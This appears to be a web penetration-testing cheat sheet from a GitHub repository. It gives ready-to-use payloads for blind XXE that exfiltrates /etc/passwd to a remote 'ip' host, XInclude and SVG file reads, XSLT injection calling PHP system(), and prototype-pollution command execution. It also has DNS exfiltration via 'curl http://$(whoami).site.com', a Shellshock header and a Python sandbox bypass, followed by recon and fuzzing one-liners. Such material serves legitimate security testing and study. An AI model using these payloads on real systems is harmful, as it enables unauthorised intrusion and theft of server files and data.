## XXE - Blind Out-Of-Band

### Exfiltrate data exfiltrating data via dtd

-> Part 1 (Main Request)

```
<!DOCTYPE r[
<!ELEMENT r ANY>
<!ENTITY % ult SYSTEM "http://ip/evil.dtd">
%ult;
%int;
]>
<r>&exfil;</r>
```
  
-> Part 2 (evil.dtd)
  
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">  
<!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">  
```  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd

### Retrieve data via error messages with dtd file
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd  

-> Part 1 (Request Principal)
```
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://ip/error.dtd"> 
%xxe;
%payload;
%remote;
]>
```
-> Part 2 (error.dtd)

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
```
  
### XInclude to retrieve files with dtd file

`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>`

### Image file upload

```<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;</text></svg>```  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.svg

## XSLT Server Side Injection
  
### Identify  
-> Transformation Service  
-> XSLT engine  

### Exploit 
-> ok.xsl
```
<!--
- Simple test to call php function
-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:php="http://php.net/xsl"
version="1.0">
<!-- We add the PHP's xmlns -->
 <xsl:template match="/">
 <html>
 <!-- We use the php suffix to call the function ucwords() -->
 <xsl:value-of select="php:function('system','uname -a')" />
 <!-- Output: 'Php Can Now Be Used In Xsl' -->
 </html>
 </xsl:template>
</xsl:stylesheet>
```

## Prototype Pollution

### Client Side
  
https://github.com/BlackFan/client-side-prototype-pollution
  
### Server Side

-> exec.exec in req body with lodash - application/json
  
```
"__proto__":{
  "shell":"sleep 5"
}
```  
https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
  
-> exec.fork in req body with lodash - application/json  

```
  "__proto__":{
    "execPath":"/bin/bash",
    "execArgv":[
    "-c",
    "sleep 5"  
    ]
  }
```  
https://nodejs.org/api/process.html

### RCE - Exfiltrating via dns

```
curl http://$(whoami).site.com/
curl http://`whoami`.site.com/
```
   
-> Tricks - Bypass  
`"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";`

### Shellshock

`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com`

### CMS

#### Wordpress

-> Tool  
`wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive`  
https://wpscan.com/wordpress-security-scanner

#### Joomla!

-> Tool  
https://github.com/oppsec/juumla

#### Drupal

-> Tool  
https://github.com/SamJoan/droopescan

## Fuzzing (+) 

### Wordlist for subdomain fuzzing
  
https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

### Fuzzing Subdomain - DNS

`ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`

### Fuzzing Subdomain - VHOST
  
`ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx`

### Fuzzing File Extension
  
`ffuf -u "https://site.com/indexFUZZ" -w web-extensions.txt -fs xxx`

### Fuzzing Parameter GET

`ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx`
  
### Fuzzing Parameter POST
  
`ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx`

## Web Recon (+)
### Recon in ASN  
-> asnpepper  
`python asnpepper.py -o <org> -O output.txt`  
-> masscan  
`masscan -iL cidrs.txt -oG output.txt — rate 10000 -p 80, 443, 8080`  
or  
`python asnpepper.py -o <org> --test-port 80,443 --threads 2000`  

->  
https://bgp.he.net/  
https://github.com/rodolfomarianocy/asnpepper  
https://github.com/robertdavidgraham/masscan  
### One Line Commands
#### Parameters Discovery
`python paramspider.py -d stripe.com | uro | httpx -fc 404 | anew spider_parameters.txt`  
`echo stripe.com | gau | gf xss | uro |  httpx -fc 404 | anew gau_parameters.txt`

### Other Steps

#### 1 - Subdomain Discovery

1.1-> sublist3r

`subslit3r -d site.com -o sublist3r_subdomains.txt`

1.2-> ctfr

`python ctfr.py -d site.com -o ctfr_subdomains.txt`

1.3-> Merge sublist3r+ctfr

`cat sublist3r_subdomains.txt ctfr_subdomains.txt > merge_subdomains.txt`

1.4-> Filter and Status Check

`cat merge_subdomains.txt | sort | uniq | grep -v "*" | httpx -o checked_subdomains.txt`

#### 2 - URL Discovery - Fetches known URLs

2.1 -> gau

`cat checked_subdomains.txt | gau > gau_urls.txt`

2.2 -> Filter and Status Check

`cat gau_urls.txt | gf xss | httpx -o checked_urls.txt`

#### 3 - Parameter Discovery

3.1 -> gau+gf+uro+httpx

`cat gau_urls.txt | gf xss | uro | httpx -fc 404 -o parameters_gau.txt`

3.2 -> paramspider + uro + httpx

`cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d`  
`cat paramspider.txt | uro | httpx -fc 404 -o paramspider_final.txt`

#### 4 - Files Discovery

4.1 -> gau+grep+httpx

`cat gau_urls.txt | grep "\.js" | httpx -fc 404 -o js_files.txt`  

-> Used Tools

https://github.com/aboul3la/Sublist3r.git  
https://github.com/UnaPibaGeek/ctfr  
https://github.com/devanshbatham/ParamSpider  
https://github.com/projectdiscovery/httpx  
https://github.com/tomnomnom/gf  

#### Other Tools

-> Project Discovery (Subdomain Discovery)

https://chaos.projectdiscovery.io/#/

-> aquatone (Tool for visual inspection of websites)

https://github.com/michenriksen/aquatone
  
### Other tools and things
  
### ImageTragik

codes/others/tragik.jpg
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
  
### Search across a half million git repos
  
https://grep.app
  
### The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
  
https://gchq.github.io/CyberChef/
  
### List of file signatures
  
https://en.wikipedia.org/wiki/List_of_file_signatures

### Regex 
  
https://regex101.com/

### Encode for SQL Injection in Json
  
https://dencode.com/string/unicode-escape
  
### Wildcard DNS

https://nip.io/
  
### Explain Shell

https://explainshell.com/

### CeWL - Custom Word List generator

https://github.com/digininja/CeWL

### Webhook online
  
https://webhook.site/#!/b3d5ed21-b58d-4a77-b19d-b7cdc2eeadc0
  
### Reverse Shell
  
https://www.revshells.com/
 
### Api Security

https://platform.42crunch.com/
